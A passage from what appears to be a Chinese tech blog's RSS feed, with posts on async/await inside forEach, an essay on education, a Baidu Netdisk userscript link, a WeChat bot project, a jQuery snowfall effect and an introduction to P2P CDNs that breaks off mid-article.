<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">1000</span>); </span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>运行得到的结果是按顺序排列的。用同样的方式分别用for…of循环以及map、filter、reduce等方法将代码进行改写，测试后得出结论：<br><strong>async&#x2F;await在for&#x2F;for…of循环中可以正常按期望运行，在使用回调函数的数组方法(forEach、map、filter、reduce)时会出现问题</strong></p><h2 id="原因探究"><a href="#原因探究" class="headerlink" title="原因探究"></a>原因探究</h2><p>其实说到这里解决方法已经很明显了，<strong>将数组方法(forEach)替换为循环(for&#x2F;for…of)即可解决</strong>，那么我们继续来探究一下具体的原因。<br>众所周知，await&#x2F;async本质上就是Promise的一个语法糖，所以问题应该是出现在forEach方法上。<br>通过查阅MDN文档，我找到了forEach方法的Pollyfill如下(也看到了对这个问题的特别提醒。。。早点看就不会出这个问题了)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Production steps of ECMA-262, Edition 5, 15.4.4.18</span></span><br><span class="line"><span class="comment">// Reference: http://es5.github.io/#x15.4.4.18</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span> = <span class="keyword">function</span>(<span class="params">callback, thisArg</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> T, k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&#x27; this is null or not defined&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. Let O be the result of calling toObject() passing the</span></span><br><span class="line">    <span class="comment">// |this| value as the argument.</span></span><br><span class="line">    <span class="keyword">var</span> O = <span class="title class_">Object</span>(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Let lenValue be the result of calling the Get() internal</span></span><br><span class="line">    <span class="comment">// method of O with the argument &quot;length&quot;.</span></span><br><span class="line">    <span class="comment">// 3. Let len be toUint32(lenValue).</span></span><br><span class="line">    <span class="keyword">var</span> len = O.<span class="property">length</span> &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. If isCallable(callback) is false, throw a TypeError exception. </span></span><br><span class="line">    <span class="comment">// See: http://es5.github.com/#x9.11</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(callback + <span class="string">&#x27; is not a function&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. If thisArg was supplied, let T be thisArg; else let</span></span><br><span class="line">    <span class="comment">// T be undefined.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      T = thisArg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. Let k be 0</span></span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. Repeat, while k &lt; len</span></span><br><span class="line">    <span class="keyword">while</span> (k &lt; len) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> kValue;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// a. Let Pk be ToString(k).</span></span><br><span class="line">      <span class="comment">//    This is implicit for LHS operands of the in operator</span></span><br><span class="line">      <span class="comment">// b. Let kPresent be the result of calling the HasProperty</span></span><br><span class="line">      <span class="comment">//    internal method of O with argument Pk.</span></span><br><span class="line">      <span class="comment">//    This step can be combined with c</span></span><br><span class="line">      <span class="comment">// c. If kPresent is true, then</span></span><br><span class="line">      <span class="keyword">if</span> (k <span class="keyword">in</span> O) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// i. Let kValue be the result of calling the Get internal</span></span><br><span class="line">        <span class="comment">// method of O with argument Pk.</span></span><br><span class="line">        kValue = O[k];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ii. Call the Call internal method of callback with T as</span></span><br><span class="line">        <span class="comment">// the this value and argument list containing kValue, k, and O.</span></span><br><span class="line">        callback.<span class="title function_">call</span>(T, kValue, k, O);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// d. Increase k by 1.</span></span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 8. return undefined</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，第56行在while循环内直接调用了我们的回调函数<br>由于await必须位于异步函数之中，要与async成对使用，导致我们传入的回调函数其实是一个异步函数(或者说是Promise)<br>由于没有await的阻塞，循环内部按异步执行，导致了顺序与期望的不同<br><strong>而解决方法就是将数组方法(forEach)替换为循环(for&#x2F;for…of)</strong></p><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach">MDN Web Doc: Array.prototype.forEach()</a></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      <category domain="https://zerospace.dev/tags/JavaScript/">JavaScript</category>
      
      
      <comments>https://zerospace.dev/posts/e6a259a0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>教育能让我们变得更好么</title>
      <link>https://zerospace.dev/posts/88de8a51/</link>
      <guid>https://zerospace.dev/posts/88de8a51/</guid>
      <pubDate>Tue, 17 Dec 2024 13:15:29 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2024/12/17/yIqZQGpKjn5b7Mr.webp&quot; alt=&quot;true&quot;&gt;&lt;/p&gt;
&lt;p&gt;孔子一向被中国人视为至圣先师，不仅才能广大，在道德上更是完人&lt;br&gt;但这样一位圣人所教的弟子中，却出了帮助鲁国</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="https://s2.loli.net/2024/12/17/yIqZQGpKjn5b7Mr.webp" alt="true"></p><p>孔子一向被中国人视为至圣先师，不仅才能广大，在道德上更是完人<br>但这样一位圣人所教的弟子中，却出了帮助鲁国贵族季氏聚敛民财的冉有、恶意低毁同门的公伯寮</p><p>东汉大儒郑玄，也是学问与道德上的典范<br>为世人所重，黄巾军起，烧杀抢掠无所顾忌，但会刻意不去骚扰郑玄的故乡<br>郑玄有一个弟子叫郗虑，却做出了令人大跌眼镜的事<br>充当起曹操的枪手，罗织罪名将正直之士孔融置于死地</p><p>冉有、郗虑等人所受的是当世最好的教育，犹且如此<br>这基本可以得出一个结论：良好的教育，不一定能让人变得更好<br>不过，如果就此否定教育的作用，显然会走向反智仇学的极端，典型表现就是读书无用论</p><p>别以为在互联网高度发达的今日，读书无用论已丧失市场，其实抱持这种看法的人多得很<br>尤其是那些做成一些事、赚到一些钱的人，他们大概曾经笃信教育对人有良好作用<br>然而在做事过程中发现此前学的东西根本不敷用，于是举起大棒，把昔日信奉的理念捶了个粉碎</p><p>如果这些人听说冉有、郗虑的故事，肯定喜出望外<br>因为那些案例正是他们鄙薄教育的有力证据<br>至于孔子、郑玄教出了众多杰出弟子，后市受孔子、郑玄影响的英伟士人不可胜数<br>这些事实就被他们选择性地无视了</p><p>即使如此，我们也不能骤然判决读书无用论者是错误的<br>毕竟他们也是根据自己鲜活的生命经验得出的结论，这是任何人都不能被夺的<br>有人试图说服他们，其实当你一旦有这个想法，就已陷入极度被动之中<br>既然你笃信教育的良好作用，那么你必须是个取得一定成就的人<br>同时你所信奉的教育与你的成就须有因果关系<br>整个链条都做得完美无瑕了，才有可能说服对方</p><p>所以，与其付出巨大说服成本去做一件收益低微的事情，还不如自问一下<br>假如自己也跟他们一样被所受过的教育狠狠伤害过，自己还会不会笃信教育的作用？<br>要想没有恨意，其实是非常难的<br>这意味着，我们在受教育之初就需要管理自己对教育的预期</p><p>在这种时候，冉有、郗虑等事例的非凡意义就凸显了，他们能让我们降低对教育的期望值，还可以帮助我们审视如下思想<br>生而为人，能不能帮权贵压榨百姓？可不可以陷害别人？<br>假如结论是斩钉截铁的“不能”，那么孔门教育就是有希望的<br>因为这就是孔子所提倡的士人理念“行己有耻”</p><p>最近与一些大学学生网聊，我告诉他们，大家从小地方来到大城市<br>但凡生活过一段时间就能发现，世界是非常复杂的，一些事项甚至会挑战你的基础认知<br>勤劳未必致富、学识带不来效益、敬业难以上位<br>凡此种种，会令笃信“能者居之”的你痛苦不堪<br>更有甚者，还会罗织各种“案例”，告诉你寒门难出贵子、阶层逐渐固化，希望你赶紧向命运跪下磕头并就此躺平</p><p>动物都护食，人也一样。所以我们从书卷缝隙看到，无论在什么时候，利益壁垒都无处不在，这是人性使然<br>出身平凡的我们，在大城市奋斗得头破血流，才能喝上一碗肉汤——在小地方，也许只能换来一碗白粥</p><p>但这又如何？古今中外一大美景，不就是无数出身寒微的人<br>无论外界怎样想方设法暗示他们前路没有希望<br>他们都能不为所动，奋力冲破各种壁垒，从而活出了一种坚姿吗？</p><p>所以，在世间众多确定性不断被摧毁的情况下<br>坚信教育能让人变好、笃信人无论处于哪个阶段都需要折节进学<br>几乎是我们无名之辈改变人生的最后希望</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      
      <comments>https://zerospace.dev/posts/88de8a51/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>让青春无界-度盘JS脚本</title>
      <link>https://zerospace.dev/posts/3f85ea3f/</link>
      <guid>https://zerospace.dev/posts/3f85ea3f/</guid>
      <pubDate>Mon, 16 Dec 2024 14:34:43 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;百度网盘会员青春版-让“青春”无界的-JS-脚本&quot;&gt;&lt;a href=&quot;#百度网盘会员青春版-让“青春”无界的-JS-脚本&quot; class=&quot;headerlink&quot; title=&quot;百度网盘会员青春版 - 让“青春”无界的 JS 脚本&quot;&gt;&lt;/a&gt;百度网盘会员青春版 - </description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="百度网盘会员青春版-让“青春”无界的-JS-脚本"><a href="#百度网盘会员青春版-让“青春”无界的-JS-脚本" class="headerlink" title="百度网盘会员青春版 - 让“青春”无界的 JS 脚本"></a>百度网盘会员青春版 - 让“青春”无界的 JS 脚本</h2><p><a href="https://greasyfork.org/en/scripts/501407-%E6%94%B9-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E4%BC%9A%E5%91%98%E9%9D%92%E6%98%A5%E7%89%88">(改)百度网盘会员青春版</a></p><p>《也许同类型中最好用？》系列 - 显示百度网盘身份信息为会员<br>支持使用视频倍速、生成字幕、下载AI字幕、关闭AI聊天、修改头像、修改用户名等功能<br>自定义程度超高！<br>需要修改头部代码来配置显示内容（非常简单！）</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/JavaScript/">JavaScript</category>
      
      
      <comments>https://zerospace.dev/posts/3f85ea3f/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>基于Java和Web协议的微信机器人</title>
      <link>https://zerospace.dev/posts/1bd49fe9/</link>
      <guid>https://zerospace.dev/posts/1bd49fe9/</guid>
      <pubDate>Mon, 09 Dec 2024 10:57:47 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前段时间闲来无事，研究了一下微信机器人，业界成熟的方案有wechaty、windows hook方案、付费协议接入等，但奈何囊中羞涩且不作为</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间闲来无事，研究了一下微信机器人，业界成熟的方案有wechaty、windows hook方案、付费协议接入等，但奈何囊中羞涩且不作为商业用途，每月为了这个花几百块还是不划算的</p><p>所以开始寻找免费方案，那就是web网页版协议了。gayhub上已经有很多基于web微信的机器人了，但都有些问题</p><ol><li>现有的web微信机器人大多使用python实现，新增功能不方便；</li><li>开发时找到的基于Java实现的项目大多存在停更、新增功能不便等问题</li></ol><h1 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h1><ol><li>免费、开源；</li><li>Java实现，有足够的生态支撑，且正在更新维护；</li><li>使用UOS请求头，新老微信号皆可登录；</li><li>docker支持，bot本体大小10.4M，docker镜像154M，可部署到服务器、软路由等设备；</li><li>支持扫码登录、登录信息加密存储（无需频繁扫码）、心跳超时重启（需使用docker部署）；</li><li>完善的插件（命令）机制，添加新功能由插件实现，不用更改bot代码。插件可运行时热加载，无需重启bot；</li><li>我自己的机器人已经挂在软路由上跑了4个多月了，没有封禁的问题（只有两次群友发情，机器人短时间内发送大量图片导致发送图片的接口被短时封禁）</li></ol><h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://gitee.com/ilooli/wechat-bot">wechat-bot: 微信机器人 (gitee.com)</a><br><a href="https://gitee.com/ilooli/wechat-bot-plugins">wechat-bot-plugins: 微信机器人插件合集 (gitee.com)</a></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/Java/">Java</category>
      
      
      <comments>https://zerospace.dev/posts/1bd49fe9/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2024-12-06的一次更新</title>
      <link>https://zerospace.dev/posts/3fda8760/</link>
      <guid>https://zerospace.dev/posts/3fda8760/</guid>
      <pubDate>Fri, 06 Dec 2024 12:44:13 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;2024-12-06-更新日志&quot;&gt;&lt;a href=&quot;#2024-12-06-更新日志&quot; class=&quot;headerlink&quot; title=&quot;2024-12-06 更新日志&quot;&gt;&lt;/a&gt;2024-12-06 更新日志&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;新增小工具&lt;/li&gt;
&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="2024-12-06-更新日志"><a href="#2024-12-06-更新日志" class="headerlink" title="2024-12-06 更新日志"></a>2024-12-06 更新日志</h2><ol><li>新增小工具</li></ol><ul><li>会员音乐解锁器</li><li>Base64编解码工具</li><li>Random随机数生成</li></ul><ol start="2"><li>接入国内优化线路</li></ol><ul><li>主域名线路 zerospace.dev</li><li>国内优化线路 blog.hiyun.top</li></ul><ol start="3"><li>优化&#x2F;细化Tags</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      
      <comments>https://zerospace.dev/posts/3fda8760/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>JavaScript飞雪特效</title>
      <link>https://zerospace.dev/posts/ace5b963/</link>
      <guid>https://zerospace.dev/posts/ace5b963/</guid>
      <pubDate>Tue, 03 Dec 2024 09:36:19 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;马上就要到了传统节日“春节”?&lt;br&gt;网站添加了飞雪❄️特效&lt;/p&gt;
&lt;p&gt;从网上找了源代码&lt;br&gt;你可以复制到自己的网站或者博客体验一波&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p</description>
        
      
      
      
      <content:encoded><![CDATA[<p>马上就要到了传统节日“春节”?<br>网站添加了飞雪❄️特效</p><p>从网上找了源代码<br>你可以复制到自己的网站或者博客体验一波</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">(<span class="keyword">function</span>(<span class="params">$</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">$.fn.<span class="property">snow</span> = <span class="keyword">function</span>(<span class="params">options</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> $flake = $(<span class="string">&#x27;&lt;div id=&quot;snowbox&quot; /&gt;&#x27;</span>).<span class="title function_">css</span>(&#123;<span class="string">&#x27;position&#x27;</span>: <span class="string">&#x27;absolute&#x27;</span>,<span class="string">&#x27;z-index&#x27;</span>:<span class="string">&#x27;9999&#x27;</span>, <span class="string">&#x27;top&#x27;</span>: <span class="string">&#x27;-50px&#x27;</span>&#125;).<span class="title function_">html</span>(<span class="string">&#x27;❄&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript">documentHeight = $(<span class="variable language_">document</span>).<span class="title function_">height</span>(),</span></span><br><span class="line"><span class="language-javascript">documentWidth= $(<span class="variable language_">document</span>).<span class="title function_">width</span>(),</span></span><br><span class="line"><span class="language-javascript">defaults = &#123;</span></span><br><span class="line"><span class="language-javascript">minSize: <span class="number">6</span>,</span></span><br><span class="line"><span class="language-javascript">maxSize: <span class="number">10</span>,</span></span><br><span class="line"><span class="language-javascript">newOn: <span class="number">1000</span>,</span></span><br><span class="line"><span class="language-javascript">flakeColor: <span class="string">&quot;#FFFFFF&quot;</span> <span class="comment">/* 此处可以定义雪花颜色 */</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">options= $.<span class="title function_">extend</span>(&#123;&#125;, defaults, options);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> interval= <span class="built_in">setInterval</span>( <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> startPositionLeft = <span class="title class_">Math</span>.<span class="title function_">random</span>() * documentWidth - <span class="number">100</span>,</span></span><br><span class="line"><span class="language-javascript">startOpacity = <span class="number">0.5</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>(),</span></span><br><span class="line"><span class="language-javascript">sizeFlake = options.<span class="property">minSize</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>() * options.<span class="property">maxSize</span>,</span></span><br><span class="line"><span class="language-javascript">endPositionTop = documentHeight - <span class="number">200</span>,</span></span><br><span class="line"><span class="language-javascript">endPositionLeft = startPositionLeft - <span class="number">500</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">500</span>,</span></span><br><span class="line"><span class="language-javascript">durationFall = documentHeight * <span class="number">10</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">5000</span>;</span></span><br><span class="line"><span class="language-javascript">$flake.<span class="title function_">clone</span>().<span class="title function_">appendTo</span>(<span class="string">&#x27;body&#x27;</span>).<span class="title function_">css</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">left</span>: startPositionLeft,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">opacity</span>: startOpacity,</span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;font-size&#x27;</span>: sizeFlake,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">color</span>: options.<span class="property">flakeColor</span></span></span><br><span class="line"><span class="language-javascript">&#125;).<span class="title function_">animate</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">top</span>: endPositionTop,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">left</span>: endPositionLeft,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">opacity</span>: <span class="number">0.2</span></span></span><br><span class="line"><span class="language-javascript">&#125;,durationFall,<span class="string">&#x27;linear&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">this</span>).<span class="title function_">remove</span>()</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;, options.<span class="property">newOn</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">&#125;)(jQuery);</span></span><br><span class="line"><span class="language-javascript">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    $.fn.<span class="title function_">snow</span>(&#123; </span></span><br><span class="line"><span class="language-javascript">    <span class="attr">minSize</span>: <span class="number">5</span>, <span class="comment">/* 定义雪花最小尺寸 */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">maxSize</span>: <span class="number">20</span>,<span class="comment">/* 定义雪花最大尺寸 */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">newOn</span>: <span class="number">800</span>  <span class="comment">/* 定义密集程度，数字越小越密集 */</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      <category domain="https://zerospace.dev/tags/JavaScript/">JavaScript</category>
      
      
      <comments>https://zerospace.dev/posts/ace5b963/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>谈谈P2P内容分发网络</title>
      <link>https://zerospace.dev/posts/3bf84f0e/</link>
      <guid>https://zerospace.dev/posts/3bf84f0e/</guid>
      <pubDate>Sat, 30 Nov 2024 11:09:41 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;名词介绍&quot;&gt;&lt;a href=&quot;#名词介绍&quot; class=&quot;headerlink&quot; title=&quot;名词介绍&quot;&gt;&lt;/a&gt;名词介绍&lt;/h2&gt;&lt;p&gt;P2P CDN（简称PCDN）是一种基于P2P技术的内容分发网络&lt;br&gt;与传统的CDN不同，PCDN通过挖掘和利用边缘网络中</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="名词介绍"><a href="#名词介绍" class="headerlink" title="名词介绍"></a>名词介绍</h2><p>P2P CDN（简称PCDN）是一种基于P2P技术的内容分发网络<br>与传统的CDN不同，PCDN通过挖掘和利用边缘网络中的海量碎片化闲置资源，构建出一个低成本、高品质的内容分发网络服务</p><p>在PCDN中，用户既是内容的消费者，也是内容的分发者<br>当一个用户下载某个内容时，他可以从其他用户的节点中获取数据<br>同时自己也作为节点为其他用户提供数据传输服务<br>这种点对点的传输方式使得PCDN具有极高的扩展性和容错性<br>能够在用户量激增的情况下仍保持稳定的性能</p><h2 id="相关技术"><a href="#相关技术" class="headerlink" title="相关技术"></a>相关技术</h2><h3 id="对等式网络"><a href="#对等式网络" class="headerlink" title="对等式网络"></a>对等式网络</h3><p>对等式网络（英语：peer-to-peer， 简称P2P），又称点对点技术，是去中心化、依靠用户群（peers）交换信息的互联网体系<br>它的作用在于，减低以往网路传输中的节点，以降低资料遗失的风险<br>与有中心服务器的中央网络系统不同，对等网络的每个用户端既是一个节点，也有服务器的功能，任何一个节点无法直接找到其他节点，必须依靠其户群进行信息交流</p><p>P2P节点能遍布整个互联网，也给包括开发者在内的任何人、组织或政府带来监控难题<br>P2P在网络隐私要求高和文件共享领域中，得到了广泛的应用<br>使用一般型P2P技术的网络系统有比特币、Gnutella或自由网等</p><p><img src="https://s2.loli.net/2024/09/17/V9zNYf6ld1vtyXA.png" alt="P2P"></p><p>传统下载，都是一个服务器，N个客户端<br>所有客户端，都去服务器下载数据。而P2P的话，A用户下载一部分，B用户也下载了一部分<br>然后，A用户和B用户之间，互相分享对方已有的数据<br>这样的话，减轻了服务器的压力。甚至说，服务器关掉，也不影响剩下用户之间完成全部数据的下载</p><p>大名鼎鼎的BT（BitTorrent）下载，就是P2P下载<br>它所体现的，就是“人人为我，我为人人”的互联网精神</p><h3 id="内容分发网络"><a href="#内容分发网络" class="headerlink" title="内容分发网络"></a>内容分发网络</h3><p>內容分发网络（英语：Content Delivery Network或Content Distribution Network，缩写：CDN）<br>是指一种透过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、影片、应用程序及其他文件发送给用户<br>来提供高性能、可扩展性及低成本的网络内容传递给用户</p><p>内容分发网络的总承载量可以比单一骨干最大的带宽还要大<br>这使得内容分发网络可以承载的用户数量比起传统单一服务器<br>内容分发网络另外一个好处在于有异地备援。当某个服务器故障时，系统将会调用其他邻近地区的服务器服务，进而提供接近100%的可靠度<br>除此之外，内容分发网络提供给服务提供者更多的控制权。提供服务的人可以针对客户、地区，或是其他因子调整</p><p><img src="https://s2.loli.net/2024/09/17/nOfdHEKtow3bu5B.png" alt="CDN"></p><p>传统方式，数据放在主服务器，大家都来取，服务器负担很大，带宽有瓶颈<br>CDN把数据放在离用户更近的区域服务器上。这样，就实现了“内容的分发”<br>主服务器的压力小了，用户看电影也不容易卡顿</p><h2 id="PCDN-P2P-CDN"><a href="#PCDN-P2P-CDN" class="headerlink" title="PCDN&#x3D;P2P+CDN"></a>PCDN&#x3D;P2P+CDN</h2><p>PCDN，是P2P和CDN技术的结合，是基于P2P技术的CDN<br>PCDN直接把内容放在了用户的家里，例如手机终端上，或者路由器上，变成了规模更大的“内容源”</p><p>举例来说，你使用某视频App，观看了一个连续剧<br>附近的其他用户，如果也观看这个连续剧，就会从你的手机里，取用一部分数据<br>再例如，你使用某网盘App，下载了一份电子书<br>附近的其他用户，如果也要下载这份电子书，就可以从你的手机里，取用数据</p><p>客户端上的PCDN，不仅可以通过手机App来实现，也可以直接部署在无线路由器上。</p><p><img src="https://s2.loli.net/2024/09/17/Iq7cd6KELfmNaMw.png" alt="PCDN"></p><h2 id="被封杀的PCDN"><a href="#被封杀的PCDN" class="headerlink" title="被封杀的PCDN"></a>被封杀的PCDN</h2><h3 id="为什么要封杀PCDN？"><a href="#为什么要封杀PCDN？" class="headerlink" title="为什么要封杀PCDN？"></a>为什么要封杀PCDN？</h3><p>首先，海量的PCDN流量，对运营商骨干传输网络，形成了巨大压力<br>用户的宽带都是包月的，不是按流量计费。用的越多，运营商网络压力越大，关键还收不到更多钱<br>其次，视频服务商们，搭建常规CDN服务节点，需要租用运营商的高价机房和带宽<br>现在服务商都用PCDN了，资源租用大幅减少，影响了运营商的盈利。触碰了核心利益，运营商当然要封杀</p><h3 id="封杀PCDN的难度"><a href="#封杀PCDN的难度" class="headerlink" 